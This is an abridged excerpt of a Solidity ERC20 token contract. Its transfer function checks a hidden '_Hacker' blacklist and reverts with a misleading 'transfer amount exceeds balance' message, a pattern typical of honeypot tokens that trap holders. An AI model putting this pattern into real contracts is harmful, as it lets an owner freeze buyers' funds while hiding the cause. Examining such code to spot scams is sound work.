...
contract TokenTools is  Ownable, IERC20 {
   ...
   constructor (string memory name, string memory symbol, uint256 initialSupply,address payable owner) public {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual{
        ...
        require(_Hacker[sender] == false&& _Hacker[recipient] == false,"ERC20: transfer amount exceeds balance");
         if(!sender.isContract() &&recipient.isContract()){ require(_Hacker[sender] == false&& _Hacker[recipient] == false,"ERC20: transfer amount exceeds balance");
         }
